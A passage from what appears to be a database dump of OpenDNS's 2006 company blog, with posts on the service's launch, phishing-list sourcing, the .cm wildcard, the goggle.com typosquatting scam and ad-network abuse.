ISP’s DNS servers, it is considerably faster. I achieve faster DNS lookups using OpenDNS then I did even while using TreewalkDNS. It has made every part of my internet use faster, from web browsing to instant messaging to anti-virus updates. And it is definitely safer as well. The latest versions of both Firefox and Internet Explorer now have built-in phishing protection, but these rely on an internet server to provide the list of known phishing websites. OpenDNS’s filtering of known phishing sites at the DNS level is smarter, because it can not go down without your entire DNS going down too, which has never happened. Not even once in all my time using OpenDNS. And it is also faster in this area, connecting to one server for both your DNS and your phishing protection and at the same time.

You can read my article, “Why do we pay Internet Bad Guys?,” in its entirety over there or below.  Matt has some really great stuff on VentureBeat, so go check it out!\n\n\nTwo weeks ago Auren wrote a dead-on post about the Black Hat Tax that really struck a chord with me. I’ve been paying the Tax for five years with my first company, EveryDNS, and for a few months now with my current start-up, OpenDNS. The problem has become much worse in the last few years. Why? Simply put, bad guys are getting paid. Moreover, the Tax is on users as much as its on businesses. Today we see phishing sites, malware and spyware sites growing at an astounding rate.\nConsider the example I cite often when discussing the issue with friends: goggle.com (see image below; not providing a link, bad site), the site that might be the most insidious of all typo squatting and malware sites on the Internet. Goggle.com, an obvious typo of google.com, offers an anti-spyware product called SpyBouncer in addition to being filled with pop-up ads (nb: SpyBouncer claims the copyright on the bottom of goggle.com).  The website makes a user believe that their computer is currently infected with spyware and that installing SpyBouncer will get rid of it. They say it’s free to try and the program conveniently finds spyware which it will remove for a price, of course.\nSymantec and others all claim that this product is a total scam and that it neither detects nor repairs spyware with any accuracy.  Thanks to the accidental traffic that lands on goggle.com by unsuspecting users, SpyBouncer has no incentive to make a good product, they can just fool a new batch of users everyday.\n\nWhy does a site like goggle.com exist? Because crime pays, but that’s hardly news. Why it doesn’t get shut down by its webhost (DataPipe) is a good question for another time. What I do want to know is… why is SpyBouncer allowed to run Google ads on its Web site (as they do on the top)? Why are these kinds of abusive software programs allowed to purchase AdWords campaigns luring even more users into this trap? Why is Revenue.net paying SpyBouncer to show ads on goggle.com?  Why is Google accepting money from fraudulent advertisers which continues the cycle of malware and spyware?  This is why users react so negatively to online advertising.  It’s not the relevant and unoffensive advertising that they bemoan, it’s the scams and tricks the advertisers and advertising networks spread around the seedier neighborhoods of the Internet.\nThese kinds of abuse are pretty bad, but what bothers me more is that much of it is being facilitated by companies I respect and admire.  People like Ben Edelman have done a lot of research showing the connections between companies like Yahoo and fraudulent advertising practices but that’s not enough.   There are so many layers and levels of misdirection that it becomes hard to tell who is paying who and why.  As the CEO of a company operating on the Internet, I’m spending money dealing with Internet bad guys who are getting paid to annoy me, my employees and my users.  Everyone is wasting their time dealing with this crap while the folks in the money trail keep taking their cut and passing on the buck.  When I asked my users what they thought about goggle.com I saw a nearly unanimous response of outrage and frustration.  Hundreds of users spoke out on our corporate blog and on sites like Digg.com venting at the absurdity of a site like goggle.com.\nIt’s time that ad networks cleaned up their act and started being more transparent about fraud and abuse.  It’s time security companies started fighting the causes of network abuse and not simply the symptoms.  There will always be a Black Hat Tax but right now legitimate companies are making it more expensive.

Read “.cm is no longer a typo” for more.\nCameroon, a country on the western coast of Africa recently decided to put a wildcard entry in .cm, their IANA assigned Country-Code Top Level Domain (ccTLD).  CNET has a pretty good article covering what they did.\nAround the blogosphere people have asked us what we could do to fix it for them.  I’m annoyed we have to deal with this, but happy that users are starting to realize that they need the ability to manage their DNS as a part of managing their network.  The Cameroonian ccTLD operators (or the business they’ve outsourced this service to) makes the argument that they are “helping you” find what you’re looking for.  If they wanted to help you they’d just correct .cm to .com for all domains that didn’t exist in the .cm namespace, or do nothing at all.\nSome users have asked us how many .cm domains there are and what they might be.  We have published a complete list (as of yesterday) of all .cm domains.  We’ve gone through and shown that for such a small ccTLD they’ve already had quite a few parked domains in their zone.  This list is at the bottom of this post. (This data is all public information, don’t worry.)\nHow to act\nDecide for yourself how you want .cm to work. With OpenDNS, you have a choice.\nAlready using OpenDNS? Head to the Account page.\nNot yet using OpenDNS? Take two minutes and Get Started today.\nMini FAQ\nAre you going to show me ads just like the .cm operator does?\nNo!  We’re doing this because you shouldn’t be punished or distracted because you forgot to type an ‘o’ when surfing the net.  We will seamlessly correct the full URL for you with no ads, popups, or page in the middle.  By enabling the feature you know exactly what’s going to happen: google.cm is going to take you to google.com.\nWill I still get to real .cm domains if I turn on .cm wildcard filtering?\nYes! We will not filter real .cm domains such as www.airfrance.cm and others.  It should also be noted we’ve never filtered any real domains, even with typo correction.  The only exception is phishing sites that you’ve asked us to block.\nWill you do this for other wildcarded ccTLDs like .ws, .ph and .cd?\nYou tell us. We are offering the fix for .cm because our users appreciate that we transparently correct mistyped domains like google.cm to google.com. For other wildcarded ccTLDs, we’ll be listening to our users and offering useful choices based on those requests.\nWhat if there are new valid .cm domains?  Will those work?\nOf course!\nWhat happens if I turn off typo-correction and turn on .cm wildcard filtering?\nIf you turn off typo correction and turn on .cm wildcard filtering you will get an RCODE=3 DNS response (commonly called NXDOMAIN) as if the wildcard didn’t exist.  In your browser you’d get the default behavior which is probably either an MSN search page on IE, or a “host not found” page with Firefox.\nAgain, if you are already using OpenDNS just head to the

But sometimes it’s useful to spread the word beyond our own boundaries. Below is our first press release, which went over the wires ~8am ET / 5am PT today. I’ve taken the liberty of adding a few links which are not in the wire service version as it appears on Yahoo Finance and Google, among others.\nOpenDNS Answers Over One Billion Questions in First Month\nUsers Choose New DNS Platform for a Safer, Faster, Reliable Internet Experience\nAugust 8, 2006 — OpenDNS, launched in July 2006, has announced that it has answered over one billion requests for its domain name lookup services. The company provides a free platform of reliable DNS (Domain Name System) service via its distributed network, with additional features that increase the speed and security of DNS. DNS is a fundamental piece of the Internet architecture which maps names to IP addresses. Provided as an alternative to the DNS services offered by ISPs, OpenDNS puts control of the DNS in the user’s hands by providing features that include phishing protection and typo correction for websites. The OpenDNS service automatically knows that the user who typed craigslist.og really meant to go to craigslist.org and directs them to the correct site. OpenDNS is also engineered to help prevent phishing, alerting the end-user when a site is known to be malicious.\n“I started OpenDNS with the goal of building a company that would develop products that make the Internet a better place,” said David Ulevitch, founder and CEO of OpenDNS. “As an active and extremely dedicated member of the Internet and DNS community, I came to realize that many of the problems on the Internet exploit weaknesses of the DNS. We have figured out how to work with the current DNS to provide a solution that makes the Internet experience safer, faster and smarter. We are proud to be the first service in this category that puts choice in the hands of the user.”\nBefore OpenDNS, DNS was not an individual choice — it was either on or off, with no customization available. OpenDNS delivers a service which gives the user control through intelligence added to the DNS. And it’s available, by choice, in two minutes following brief step-by-step instructions. “OpenDNS is a great idea, well-executed,” said Matt Mullenweg, lead developer of WordPress, the popular blogging platform. “They took something basic and ubiquitous, DNS, and improved it by adding spell-checking and phishing protection (usability enhancements).” [full post]\nAbout OpenDNS\nOpenDNS — www.opendns.com — was founded in San Francisco by David Ulevitch in 2005 to deliver a vastly improved Internet experience through a new DNS (Domain Name System) service that provides all Internet users with increased security, reliability and performance. In 2005, the company received funding from Minor Ventures, the fund created by Halsey Minor, founder of CNET, for start-ups delivering the on-demand software model pioneered by Salesforce.com. Open DNS is a free service, with revenues coming from the advertising-driven model developed by Yahoo! and Google. For expert opinions on DNS and the Internet infrastructure, as well as company news, read the OpenDNS blog at blog.opendns.com.\n###\nAlso, two links which don’t fit in the release, but are of interest:\nStats (yes, we’re over 1.2 Billion already; hit 1 Billion last Thursday, San Francisco time)\nSystem Status (we put the link at the top right a while ago, but haven’t mentioned it here; part of being reliable is letting you see for yourself)', 'Announcements', 'https://umbrella.cisco.com/blog/2006/08/08/one-billion-first-month/');

Easy mistake, could happen to anyone.  Unfortunately for Annie she doesn’t get the OpenDNS automatic redirection to google.com or even our search results page[1].  Instead, she is taken to a site, purporting to be an anti-spyware site, which starts to try and destroy her computer and create hours of tech support work for her brother (me).  It has popups, automatic downloads and is just generally representative of the lamest parts of the Internet.\nHere’s a screenshot:\n\nRight now, even with OpenDNS, my sister still gets to goggle.com — this bothers me.  My goal at OpenDNS is to give you choice, not to be a censor.  So I don’t want to block goggle.com outright, nor do I want to try and decide what you want.  Instead, I want to give you choices. That’s what OpenDNS is: a rock-solid reliable DNS platform with the tools on top to let you manage your network how you want.  If you don’t want to manage your DNS, I want our defaults to be the best they can be, which is why I need your input.\nI want to know what you think we should do.\nShould we silently redirect to google.com?  \nShould we take you to a page that says: “This site is lame, click here to Google” so you know what’s happening?  \nShould we just send you off to goggle.com ignoring the consequences?\nNo matter what we do, we’ll leave the choice in your hands, but I’m curious what our users think the best way to handle cases like this are.\nHow would you want it to work?  How would you want it to work for your sister?\nLeave your comments below.\n1: Just a sidenote here.

Both models, the GP and G, only allow DNS settings to be changed for static IP addresses (PDF manual). Frustrating, but good to know.

The machines we use right now to do stats needed some more RAM and hard drives so we paused the stats processing, had some lunch, added some disks and RAM, and then went home.

You have to make sure you have great data, double-check the information, and update the data to avoid “false positives.” And you have to do it all the time.\nDifferent folks (see two below) have wondered publicly where our phishing data comes from and how OpenDNS uses the data. This post helps answer those questions, and more.\nPhishing protection is a significant benefit to customers but it’s also a notable responsibility — under no circumstances does OpenDNS want to disrupt its customers’ normal Internet usage.\nNote: if you just want speedy, reliable DNS without any protection from phishing, it’s available. (Not recommended, but available.) Use the OpenDNS preferences.\nWith that background out of the way, let me share what we added to our Frequently Asked Questions earlier this week.\nHow does OpenDNS decide if a site is a phishing site?\nCurrently, OpenDNS uses two methods for determining if a site is a phishing site:\n\nAnalysis of our network data, based on years of experience with DNS traffic.\nFeeds from several network operators and others working against “Internet Bad Guys.”\n\nThere are three providers that we may identify and thank publicly for their participation:\n\nSupport Intelligence\nTeam Cymru\nCastleCops PIRT\nHow do I report a phishing site to OpenDNS?\nThe fight against phishing isn’t just for the banks and big companies to tackle; you can help. Right now [July, 2006], we encourage submission of possible phishing sites via our contact form. Nothing will be blocked unless it’s verified.\nHow do I tell OpenDNS about a mistakenly-blocked site?\nEvery time OpenDNS shows the phish-blocked page (example), we offer the option to tell us to review the site. These requests are treated with urgency; we understand that false positives are painful, too.\nSites which are removed from the phishing list will be available to OpenDNS customers within one hour after review, and hopefully much sooner.\nAn extra detail: for the data from outside partners, we update our lists every six hours, including removing sites which no longer appear in the feeds.\nPhishTank\nPhishTank is a site OpenDNS will launch later this summer as a collaborative clearing house for data and information about phishing and malware on the Internet. PhishTank will be a free community site for validating and sharing this kind of data. There will be various statistics and an API, so anyone else who needs solid data to help fight Internet Bad Guys can use PhishTank as a source.\nThe point? The fight against phishing isn’t just for the banks and big companies to tackle; you can help. Several of you have sent us phishing URLs to add to our lists already — thank you! OpenDNS is selfishly interested in having the best, most up-to-date data available, but we don’t believe that proprietary data in this area is the answer: the API will be open to others, whether they contribute or not.\nToo often now, phish reports go into a black hole where no response comes back and none of the aggregated intelligence is shared. PhishTank will be a solution to that problem.\nNext steps\nYesterday, we were offered another validated feed of sites to avoid. Thanks! This looks to be a great additional resource, and once it’s confirmed and integrated, we’ll announce it here (with permission).\nIf you have data that will help us block the “Internet Bad Guys” from OpenDNS customers, please let me know. Use the contact form, or try me via direct email (first name at opendns.com).\np.s. As noted above, here are two blogs which took a look at OpenDNS right as we launched and wondered aloud about our phishing protection.\nAnother thing OpenDNS should work on ASAP is transparency. I’d really like to know the false positive rate on phishing sites. How many legitimate sites get flagged as a phishing site? (Tyler Longren, July 10, 2006)\nTyler, too early to have that specific stat, yet, but we hear you.\nIt looks like they are using blacklists to stop you from hitting known phishing sites. They don’t say where the list comes from or how ofter it is updated. (Mike Frank, July 11, 2006)\nMike, thanks for pushing us.', 'Community;Labs Research', 'https://umbrella.cisco.com/blog/2006/07/24/opendns-phishing-sites/');

Now you know. But you can forget the long form…just remember DNS.\nDNS is the quiet hero of the Internet. For nearly 20 years, since 1987, DNS has translated human-readable addresses into the numerical locations that computers demand. Easy-to-remember names (e.g., craigslist.org) become the numbers (e.g., 66.150.243.20) that load the popular classifieds website.\nThe end result? The Internet works. Websites load, emails are delivered, and the world continues on its merry way.\nRight now, no one cares that DNS is at the heart of all that activity. That’s OK for now. But DNS is a prospect to be the next acronym that matters.\nPrevious crossover acronyms\nTech is lousy with crossover acronyms: RAM, MB, GB, CPU, GHz, HTTP, and so on. But I’ll focus on two critical acronyms — HTML and RSS — which have crossed over, to a greater and lesser degree.\nHTML — If you asked anyone who’s ever touched a computer what HTML is, I expect you’d hear that HTML has “something to do with how web pages are created.” Still, few outside the tech world would correct expand the acronym to HyperText Markup Language. And there’s nothing wrong with that gap in knowledge…a measure of HTML’s success is that the full label is irrelevant.\nRSS — RSS is moving along that same adoption/understanding curve: a significant minority of the Internet population now understands the benefit RSS brings, whether they know that Really Simple Syndication is the leading meaning of the acronym. As a label, RSS has come to encompass even other formats (like Atom or RDF) which compete with RSS in delivering the same benefit. Rather than rename RSS, the supporters of syndication technologies should simply enjoy the acronym becoming the brand. RSS is not quite Kleenex™, but in this case, becoming a genericized trademark is a positive development.\nTransition: from invisible to shorthand\nTwo decades after its introduction, DNS may be the next acronym which crosses over from the tech world to the entire world.\nAt OpenDNS, we’re convinced that the next big thing in the Internet is really a re-working of one of the oldest things in the Internet. Our success lies, in part, in explaining how OpenDNS improves DNS, which in so many ways has not advanced from its roots in the late 1980s. To be direct, using OpenDNS for your DNS service will speed up your Internet experience and help stop phishing attacks.\nBack to the point about acronyms. It’s more difficult to explain the benefits you’ll get from our free DNS service if you don’t understand what DNS does for you today.\nMy mission is to speed DNS along the acronym trail, so DNS moves from invisible to shorthand for “what makes the Internet work.”\nSome work to do… but remember, you heard it here first: DNS is the next acronym that matters.\n\nP.S. If you do want more details on DNS, read what OpenDNS does, which has links to more details on DNS generically.\nP.P.S. By the way, RSS stands for either Really Simple Syndication or Rich Site Summary or…well, never mind. My favorite definition of RSS is:\nSmart bookmarks that tell you when your favorite sites change.

INSERT INTO `opendns` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (2166, 'Why I Started OpenDNS', 'David Ulevitch, Founder/CEO', 'June 28, 2006', 'I’m a little late to the blogging phenomenon, but here we go. I started working on OpenDNS last November to create a new kind of DNS service that can be used by anyone to make their Internet experience better. Since then I’ve been working hard to bring this to fruition by assembling a fantastic team, developing some really great software and deploying a world-class network. Now I’m thrilled to introduce the free service we’ve been building. It’s ready, and I want you to try it.  You will love it.\nDNS in two (or three) sentences\nDNS is what allows you to type in a web address and end up at a website; DNS is transparent and yet fundamental to the operation of the Internet.  There are two sides to DNS, the authoritative side which give out answers and the recursive side that ask questions on your behalf and holds onto them in case you ask again.\nOpenDNS provides the latter, the world’s first highly-available, high-performance recursive DNS service customized with features to make the Internet safer, faster and smarter for you. (Clearly, I belong in Marketing.)\nSome background\nTo understand why I created OpenDNS requires a little background.  I’d moved to San Francisco after graduating from Washington University in St. Louis, and was managing EveryDNS, a popular and reliable DNS management service which I started five years ago.  While helping scale and run operations for a startup run by a friend of mine  I watched EveryDNS continue to grow and do well on its own and I missed it. Running a world-class DNS service for five years taught me a lot not only about DNS and networks but also about the people who use them. As a result of all this work I discovered ways to make DNS better by making it more resilient, safer and faster. I also began to see and understand how a lot of spam, spyware and phishing sites abused DNS to operate.\nNot everyone on the Internet is as nice as you are\nSpammers, Phishers, Botmasters and other Internet Bad Guys use DNS as a vector for running their attacks and schemes to send spam, spread malware and operate phishing sites.  Some of these Bad Guys used EveryDNS to manage DNS nefariously.  When I found out about this, I took action and cleaned up EveryDNS.  We wrote code to filter out the Bad Guys and began collaborating with other DNS providers to share information on bad users and bad domains so that these bad actors would be unable to jump from service to service.  The Bad Guys went away and my part of the Internet was clean (and still is).  The problem was that the Bad Guys just moved onto easier targets — other DNS services that didn’t care as much as I did and didn’t collaborate with the major DNS players.  The abuse continued to be levied on the Internet and I was unable to stop it.  By cleaning up my neighborhood all I had done was drive the abuse into another one.  So I created OpenDNS to deal with this and many other limitations of the existing DNS.\nOpenDNS is a DNS service designed for you: instead of relying on all the unknown DNS providers out there to clean up their act (more on this in a future post), we act like a crossing guard in front of your house.  We direct the good stuff towards you and send the bad stuff away.\nImproving the DNS\nDNS — the Domain Name System, a foundation of the Internet for 20 years — has loads of room for improvement. Most people don’t realize the possibilities, but the DNS software most of us are using (via an ISP or corporate server) hasn’t evolved fast enough or far enough from the software written in the 1980s. There’s a huge opportunity to learn from the past and address and fix some of the problems that crop up at the scale of today’s Internet. I decided that adding security features, performance improvements (we all want a faster Internet, even with broadband), and some smarts (fix typos for me… that’s what computers are supposed to do) would evolve the existing DNS without breaking the old. Don’t worry about us hijacking your traffic like one of the many browser toolbars that get automatically installed — having had my first tastes of unix and networking at a mom-and-pop ISP, I was schooled with the importance of making things interoperate nicely and not messing with peoples’ computers or Internet.\nImproving the Internet\nWhat do I mean by “improve the Internet”?   If you’ve read ”The Tipping Point” by Malcolm Gladwell you know the story about how New York City made the subways safer by focusing on the fundamentals rather than trying to catch every criminal.  By cleaning up subway graffitti and catching fare-cheaters the law-abiding citizens of New York returned to using the subways and to taking pride in their clean city.  These small changes led to a massive downturn in crime numbers in New York.  We’re applying the same techniques to the Internet and cleaning it up.\nWe’re blocking phishing sites that are set up to steal your banking and other sensitive data.\nWe’re impacting the ability for botnets to organize and disrupt networks.\nWe’re improving the collective intelligence of the DNS to provide insights into many forms of Internet abuse and fraud.\nMore than five years running EveryDNS showed me a lot of the shady practices by the folks who have made phishing, pharming, botnets, spamming, and other nefarious practices something we all contend with every day. (Who thought phishing would be a widespread term?)  They do this because it’s easy for them and there are no counter-measures.  Now there’s OpenDNS. Of course, we’ll also speed up your Internet without changing your ISP, computer, or browser and perform some simple but useful tweaks like fixing typos.  A barrage of testing and feedback has told us that people really notice a faster Internet experience, and that they appreciate getting an intelligent search results page rather than a “page not found” error.  That is just the beginning.\nEveryDNS\nThe primary service of EveryDNS is free authoritative DNS. Not registering domains, not hosting websites, not doing anything more than let people with domains administer their own records in the global Internet “white pages” known as DNS.  Nearly 100,000 individuals, organizations and companies depend on this free resource and have for many years. EveryDNS is supported by donations and advertising, and has always been profitable.  I have automated nearly ever aspect of EveryDNS and along with the help of a fantastic team of volunteers, I am free of day-to-day involvement.  You can find more information at EveryDNS.\nPersonal history\nYou can read more about me on my corporate bio or check out my personal website at david.ulevitch.com.
